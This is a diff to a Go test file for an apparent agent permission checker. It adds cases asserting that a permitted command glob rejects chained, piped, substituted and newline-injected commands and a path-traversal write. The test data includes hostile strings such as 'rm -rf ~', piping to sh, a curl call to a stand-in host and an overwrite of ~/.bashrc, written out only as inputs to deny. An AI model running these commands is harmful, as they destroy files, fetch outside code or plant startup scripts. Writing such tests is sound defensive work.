@@ -147,7 +147,7 @@ func TestDiscover(t *testing.T) {
 
 func TestPermissions(t *testing.T) {
 	var perms []Permission
-	for _, s := range []string{"shell:go list -m -u all", "shell:git log *", "write:reports/", "delete:tmp/*.log", "web:proxy.golang.org", "mcp:github:create_*"} {
+	for _, s := range []string{"shell:go list -m -u all", "shell:git log *", "shell:make lint && make test", "write:reports/", "delete:tmp/*.log", "web:proxy.golang.org", "mcp:github:create_*"} {
 		p, err := ParsePermission(s)
 		if err != nil {
 			t.Fatal(err)
@@ -164,6 +164,15 @@ func TestPermissions(t *testing.T) {
 		{req(tools.ActionCommand, "go list -m -u all"), true},
 		{req(tools.ActionCommand, "go list -m -u all && rm -rf ~"), false},
 		{req(tools.ActionCommand, "git log --oneline"), true},
+		// A glob covers one command, never one chained, piped or substituted.
+		{req(tools.ActionCommand, "git log x; rm -rf ~"), false},
+		{req(tools.ActionCommand, "git log x | sh"), false},
+		{req(tools.ActionCommand, "git log $(curl evil.example)"), false},
+		{req(tools.ActionCommand, "git log `id`"), false},
+		{req(tools.ActionCommand, "git log x > ~/.bashrc"), false},
+		{req(tools.ActionCommand, "git log x\nrm -rf ~"), false},
+		{req(tools.ActionCommand, "make lint && make test"), true}, // exactly as permitted
+		{req(tools.ActionWrite, "reports/../main.go"), false},
 		{req(tools.ActionWrite, "reports/deps.md"), true},
 		{req(tools.ActionWrite, "reports/2026/deps.md"), true},
 		{req(tools.ActionWrite, "reports/deps.md", "main.go"), false}, // every target must be covered
